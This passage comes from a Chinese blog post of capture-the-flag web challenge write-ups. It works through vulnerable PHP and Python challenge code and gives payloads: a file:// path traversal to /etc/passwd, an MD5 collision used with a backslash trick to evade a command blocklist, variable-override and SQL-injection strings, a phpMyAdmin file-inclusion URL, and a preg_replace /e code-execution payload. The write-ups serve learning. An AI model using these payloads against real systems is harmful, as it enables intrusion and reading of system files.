<span class="keyword">or</span> (scheme <span class="keyword">and</span> scheme <span class="keyword">in</span> uses_netloc <span class="keyword">and</span> url[:<span class="number">2</span>] != <span class="string">'//'</span>):</span><br><span class="line">        <span class="keyword">if</span> url <span class="keyword">and</span> url[:<span class="number">1</span>] != <span class="string">'/'</span>: url = <span class="string">'/'</span> + url</span><br><span class="line">        url = <span class="string">'//'</span> + (netloc <span class="keyword">or</span> <span class="string">''</span>) + url</span><br><span class="line">    <span class="keyword">if</span> scheme:</span><br><span class="line">        url = scheme + <span class="string">':'</span> + url</span><br><span class="line">    <span class="keyword">if</span> query:</span><br><span class="line">        url = url + <span class="string">'?'</span> + query</span><br><span class="line">    <span class="keyword">if</span> fragment:</span><br><span class="line">        url = url + <span class="string">'#'</span> + fragment</span><br><span class="line">    <span class="keyword">return</span> _coerce_result(url)</span><br></pre></td></tr></table></figure><p>从题目源码也可以看出，这个函数的用法大概就是把 <code>url</code> 各个部分组成 <code>list</code> 传进来。</p><p>我们来分析一下这个函数：</p><p>这里的 <code>netloc</code> 就是题目中拿来判断的 <code>host</code>。</p><p>首先第一个 <code>if</code> 判断了 <code>netloc</code> 是否为空，如果不是空就进入代码块，第二个是判断 <code>schema</code> 是否为空。第三个第四个就不分析了。</p><p>仔细看看第二个 <code>if</code>，这里并没有强制要求 <code>netloc</code> 要有东西，假设一下我们传入一个这样的 <code>url</code>：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="regexp">//</span><span class="regexp">//</span>abc</span><br></pre></td></tr></table></figure><p>这个 <code>url</code> 传入入 <code>parse.urlparse</code> 时，<code>netloc</code> 是为空的，而 <code>path</code> 为 <code>//abc</code>，当进入到 <code>urlunsplit</code> 后，<code>netloc</code> 为空不进入第一块代码，<code>schema</code> 为 <code>file</code>，进入第二个代码块，拼接后 <code>url</code> 就变成了：<code>file://abc</code></p><p>所以构造<code>file:////suctf.cc/../../../../../etc/passwd</code></p><p>贴下其他nginx配置文件</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">配置文件存放目录：<span class="meta-keyword">/etc/</span>nginx</span><br><span class="line">主配置文件：<span class="meta-keyword">/etc/</span>nginx<span class="meta-keyword">/conf/</span>nginx.conf</span><br><span class="line">管理脚本：<span class="meta-keyword">/usr/</span>lib64<span class="meta-keyword">/systemd/</span>system/nginx.service</span><br><span class="line">模块：<span class="meta-keyword">/usr/</span>lisb64<span class="meta-keyword">/nginx/</span>modules</span><br><span class="line">应用程序：<span class="meta-keyword">/usr/</span>sbin/nginx</span><br><span class="line">程序默认存放位置：<span class="meta-keyword">/usr/</span>share<span class="meta-keyword">/nginx/</span>html</span><br><span class="line">日志默认存放位置：<span class="meta-keyword">/var/</span>log/nginx</span><br></pre></td></tr></table></figure><h3 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h3><p>url明显有有问题</p><p><code>img=TXpVek5UTTFNbVUzTURabE5qYz</code> =&gt; base64 =&gt;base64 =&gt; hex =&gt; 555.png</p><p>反过去 加密 <code>index.php</code>下载源码</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!isset($_GET[<span class="string">'img'</span>]) || !isset($_GET[<span class="string">'cmd'</span>])) </span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'img'</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>, <span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>, $file)) &#123;</span><br><span class="line">    echo <span class="string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;</span><br><span class="line">    die(<span class="string">"xixi～ no flag"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    echo <span class="string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line">    echo <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;</span><br><span class="line">    echo(<span class="string">"forbid ~"</span>);</span><br><span class="line">    echo <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line">        echo `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        echo (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>md5强比较，工具跑一下就出来了</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=test<span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%1</span>D<span class="symbol">%E8</span><span class="symbol">%EE</span><span class="symbol">%F4</span><span class="symbol">%CB5</span><span class="symbol">%F8</span><span class="symbol">%8</span>F<span class="symbol">%80</span><span class="symbol">%AB</span><span class="symbol">%5</span>B<span class="symbol">%04</span><span class="symbol">%603</span><span class="symbol">%BE</span><span class="symbol">%CFWJ7</span><span class="symbol">%8</span>Aw<span class="number">5</span>v<span class="symbol">%0</span>EN<span class="symbol">%9</span>A<span class="symbol">%40</span>F<span class="symbol">%11</span><span class="symbol">%C3</span><span class="symbol">%15</span><span class="symbol">%DC</span><span class="symbol">%80</span><span class="symbol">%ED</span><span class="symbol">%A9</span><span class="symbol">%F5</span><span class="symbol">%D0K</span><span class="symbol">%00</span><span class="symbol">%3</span>Co<span class="symbol">%06</span><span class="symbol">%ED</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%E2</span><span class="symbol">%0</span>EI<span class="symbol">%C3</span><span class="symbol">%5</span>B<span class="symbol">%C7</span><span class="symbol">%C3</span><span class="symbol">%96</span>t<span class="symbol">%F4</span><span class="symbol">%0</span>B<span class="symbol">%A1</span><span class="symbol">%26</span><span class="symbol">%91</span><span class="symbol">%7</span>EW<span class="symbol">%09</span><span class="symbol">%A1</span><span class="symbol">%A0R</span><span class="symbol">%AFWc</span><span class="symbol">%D5n</span><span class="symbol">%0</span>E<span class="symbol">%00</span><span class="symbol">%2</span>Fj<span class="symbol">%8</span>A<span class="symbol">%AE</span><span class="symbol">%03</span><span class="symbol">%C1</span><span class="symbol">%BD</span><span class="symbol">%08</span>VEB<span class="symbol">%16</span><span class="symbol">%F9v</span><span class="symbol">%21</span><span class="symbol">%5</span>D<span class="symbol">%C9W</span><span class="symbol">%18</span><span class="symbol">%C9U</span><span class="symbol">%29</span><span class="symbol">%7</span>D<span class="symbol">%A2</span><span class="symbol">%3</span>FyW<span class="symbol">%F6i</span><span class="symbol">%0</span>B<span class="symbol">%A6</span><span class="symbol">%C0i</span><span class="symbol">%97</span><span class="symbol">%CC</span><span class="symbol">%2</span>F<span class="symbol">%98</span>e<span class="symbol">%5</span>B<span class="symbol">%A6</span><span class="symbol">%89</span>O<span class="symbol">%FF</span><span class="symbol">%EBq</span><span class="symbol">%DA</span><span class="symbol">%9</span>F<span class="symbol">%A5</span><span class="symbol">%A7n</span><span class="symbol">%8</span>EV<span class="symbol">%9</span>B<span class="symbol">%2</span>A<span class="symbol">%FA</span><span class="symbol">%06</span>&amp;b=test<span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%1</span>D<span class="symbol">%E8</span><span class="symbol">%EE</span><span class="symbol">%F4</span><span class="symbol">%CB5</span><span class="symbol">%F8</span><span class="symbol">%8</span>F<span class="symbol">%80</span><span class="symbol">%AB</span><span class="symbol">%5</span>B<span class="symbol">%04</span><span class="symbol">%603</span><span class="symbol">%BE</span><span class="symbol">%CFWJ7</span><span class="symbol">%0</span>Aw<span class="number">5</span>v<span class="symbol">%0</span>EN<span class="symbol">%9</span>A<span class="symbol">%40</span>F<span class="symbol">%11</span><span class="symbol">%C3</span><span class="symbol">%15</span><span class="symbol">%DC</span><span class="symbol">%80</span><span class="symbol">%ED</span><span class="symbol">%A9</span><span class="symbol">%F5</span><span class="symbol">%D0K</span><span class="symbol">%00</span><span class="symbol">%3</span>Co<span class="symbol">%06</span><span class="symbol">%ED</span><span class="symbol">%3</span>A<span class="symbol">%22</span>b<span class="symbol">%0</span>FI<span class="symbol">%C3</span><span class="symbol">%5</span>B<span class="symbol">%C7</span><span class="symbol">%C3</span><span class="symbol">%96</span>t<span class="symbol">%F4</span><span class="symbol">%0</span>B<span class="symbol">%A1</span><span class="symbol">%26</span><span class="symbol">%91</span><span class="symbol">%FEW</span><span class="symbol">%09</span><span class="symbol">%A1</span><span class="symbol">%A0R</span><span class="symbol">%AFWc</span><span class="symbol">%D5n</span><span class="symbol">%0</span>E<span class="symbol">%00</span><span class="symbol">%2</span>Fj<span class="symbol">%8</span>A<span class="symbol">%AE</span><span class="symbol">%03</span><span class="symbol">%C1</span><span class="symbol">%BD</span><span class="symbol">%08</span>VEB<span class="symbol">%96</span><span class="symbol">%F9v</span><span class="symbol">%21</span><span class="symbol">%5</span>D<span class="symbol">%C9W</span><span class="symbol">%18</span><span class="symbol">%C9U</span><span class="symbol">%29</span><span class="symbol">%7</span>D<span class="symbol">%A2</span><span class="symbol">%3</span>FyW<span class="symbol">%F6i</span><span class="symbol">%0</span>B<span class="symbol">%A6</span><span class="symbol">%C0i</span><span class="symbol">%97</span><span class="symbol">%CC</span><span class="symbol">%2</span>F<span class="symbol">%98</span><span class="symbol">%E5Z</span><span class="symbol">%A6</span><span class="symbol">%89</span>O<span class="symbol">%FF</span><span class="symbol">%EBq</span><span class="symbol">%DA</span><span class="symbol">%9</span>F<span class="symbol">%A5</span><span class="symbol">%A7n</span><span class="symbol">%8</span>E<span class="symbol">%D6</span><span class="symbol">%9</span>B<span class="symbol">%2</span>A<span class="symbol">%FA</span><span class="symbol">%06</span></span><br></pre></td></tr></table></figure><p>不能用数组绕过，<code>string</code>强制类型转换后都是 “Array”</p><p>命令禁用了很多，但<strong>linux命令中可以加\，所以甚至可以ca\t /fl\ag</strong></p><p><img src="/2020/08/8月刷题记录/image-20200810172023014.png" alt="image-20200810172023014"></p><p><img src="/2020/08/8月刷题记录/image-20200810172043258.png" alt="image-20200810172043258"></p><p>其他思路1：</p><p>sort命令：sort将文件的每一行作为一个单位，相互比较，比较原则是从首字符向后，依次按ASCII码值进行比较，最后将他们按升序输出。</p><p>其他思路2：</p><p>把flag移到web目录下，然后直接访问拿到flag</p><p><img src="/2020/08/8月刷题记录/image-20200810172253738.png" alt="image-20200810172253738"></p><p><img src="/2020/08/8月刷题记录/image-20200810172317785.png" alt="image-20200810172317785"></p><h3 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h3><p>.git泄露，githack拿源码</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$yds = <span class="string">"dog"</span>;</span><br><span class="line">$is = <span class="string">"cat"</span>;</span><br><span class="line">$handsome = <span class="string">'yds'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $x &amp;&amp; $x !== <span class="string">'flag'</span>)&#123;<span class="comment">//GET方式传flag,且flag=flag</span></span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]))&#123;<span class="comment">//GET和POST其中之一必须传flag</span></span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'flag'</span>] === <span class="string">'flag'</span>  || $_GET[<span class="string">'flag'</span>] === <span class="string">'flag'</span>)&#123;<span class="comment">//GET和POST传flag,不能是flag=flag</span></span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"the flag is: "</span>.$flag;</span><br></pre></td></tr></table></figure><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$flag = file_get_contents(<span class="string">'/flag'</span>);</span><br></pre></td></tr></table></figure><p>存在变量覆盖</p><p>payload1: <code>yds=flag</code></p><p><code>$$x = $$y</code>  =&gt; <code>$(yds) = $(flag)</code> =&gt; <code>$yds=flag{xxxx}</code> =&gt; <code>exit($yds)</code></p><p>payload2:<code>is=flag&amp;flag=flag</code></p><p><code>$$x = $$y</code> =&gt; <code>$(is)=$(flag)</code> =&gt; <code>$is=flag{xxxx}</code></p><p><code>$$xx = $$y</code> =&gt; <code>$(flag)=$(flag)</code> =&gt; <code>$flag=flag{xxxx}</code></p><p><code>exit($is)</code></p><h3 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h3><p>扫描到phpinfo.php和phpmyadmin 4.8.1</p><p>参考这篇文章：<a href="https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/" target="_blank" rel="noopener">https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/</a> </p><p>有一个文件包含漏洞，加上phpinfo.php上传临时文件getshell (:</p><p>想复杂了，直接包含/flag就行</p><p>payload:<code>http://e5abf389-9025-4a73-a415-3e10dc57dc21.node3.buuoj.cn/phpmyadmin/index.php?target=db_sql.php%3f/../../../../../..//flag</code></p><h3 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h3><p>在<a href="https://www.compart.com/en/unicode/搜索" target="_blank" rel="noopener">https://www.compart.com/en/unicode/搜索</a> <strong>thousand</strong>找大于1337的字符</p><p><img src="/2020/08/8月刷题记录/image-20200810230209866.png" alt="image-20200810230209866"></p><p>提交 <code>%E1%8D%BC</code>即可得到flag</p><h3 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h3><p>按照提示加入header</p><p>1.Client-IP</p><p>2.X-Forwarded-For</p><p>3.Remote_Addr</p><p>均可以修改IP</p><p>php下的模板注入</p><p><img src="/2020/08/8月刷题记录/image-20200810232530556.png" alt="image-20200810232530556"></p><h3 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h3><p>登录了之后在发布广告处存在sql注入漏洞，我们输入的内容在输入后没有漏洞，当我们发布广告后查看广告详情的时候就造成了二次注入，从而产生了注入。</p><p>题目环境过滤了空格，我们使用/**/来进行绕过过滤了or，因此我们无法使用order by 以及information_schema这个库因为过滤了注释符，所以查询语句的最后我们要闭合单引号</p><p>无列名注入</p><p><code>1&#39;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/’</code></p><p>这里我们将users这个表里面的查询的结果提供给外部查询，同时把列名转换成a,b，这样我们后面就直接查询a,b列就可以获得结果</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>'<span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>, (select<span class="comment">/**/</span>group_concat(a)<span class="comment">/**/</span>from(select<span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span><span class="comment">/**/</span>as<span class="comment">/**/</span>a,<span class="number">3</span><span class="comment">/**/</span>as<span class="comment">/**/</span>b<span class="comment">/**/</span>union<span class="comment">/**/</span>sele ct*from<span class="comment">/**/</span>users)x),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span><span class="comment">/**/</span>'</span><br></pre></td></tr></table></figure><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>'<span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>, (select<span class="comment">/**/</span>group_concat(b)<span class="comment">/**/</span>from(select<span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span><span class="comment">/**/</span>as<span class="comment">/**/</span>a,<span class="number">3</span><span class="comment">/**/</span>as<span class="comment">/**/</span>b<span class="comment">/**/</span>union<span class="comment">/**/</span>sele ct*from<span class="comment">/**/</span>users)x),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span><span class="comment">/**/</span>'</span><br></pre></td></tr></table></figure><h3 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"I have a dream"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Not now!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>($file);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/08/8月刷题记录/image-20200812174257429.png" alt="image-20200812174257429"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">$_SESSION[<span class="string">'id'</span>] = $id;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span><span class="params">($re, $str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">'/('</span> . $re . <span class="string">')/ei'</span>,</span><br><span class="line">        <span class="string">'strtolower("\\1")'</span>,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $re =&gt; $str) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex($re, $str). <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">true@<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>preg_replace()使用的/e模式可以存在<a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">远程执行代码</a></p><p>payload:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?.*=&#123;<span class="variable">$&#123;phpinfo()&#125;</span>&#125;</span><br><span class="line">\S*=<span class="variable">$&#123;phpinfo()&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/08/8月刷题记录/image-20200812174555693.png" alt="image-20200812174555693"></p><h3 id="BJDCTF-2nd-假猪套天下第一"><a href="#BJDCTF-2nd-假猪套天下第一" class="headerlink" title="[BJDCTF 2nd]假猪套天下第一"></a>[BJDCTF 2nd]假猪套天下第一</h3><p>确实第一</p><p>抓包发现 L0g1n.php</p><p><img src="/2020/08/8月刷题记录/image-20200812181110056.png" alt="image-20200812181110056"></p><p><img src="/2020/08/8月刷题记录/image-20200812181236407.png" alt="image-20200812181236407"></p><p>各种header集合</p><table><thead><tr><th>Header</th><th>解释</th><th>示例</th></tr></thead><tbody><tr><td>Accept</td><td>指定客户端能够接收的内容类型</td><td>Accept: text/plain, 